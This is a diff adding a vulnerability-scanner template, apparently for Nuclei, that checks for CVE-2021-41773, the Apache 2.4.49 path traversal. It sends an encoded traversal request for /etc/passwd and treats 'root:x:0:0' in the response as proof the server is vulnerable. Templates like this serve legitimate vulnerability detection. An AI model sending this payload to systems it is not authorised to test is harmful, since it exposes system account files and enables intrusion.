@@ -1,0 +1,14 @@
+id: cve-2021-41773
+info:
+  name: Apache Path Traversal
+  severity: high
+  description: Проверка раскрытия /etc/passwd через Apache 2.4.49.
+requests:
+  - method: GET
+    path: "/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words: ["root:x:0:0"]
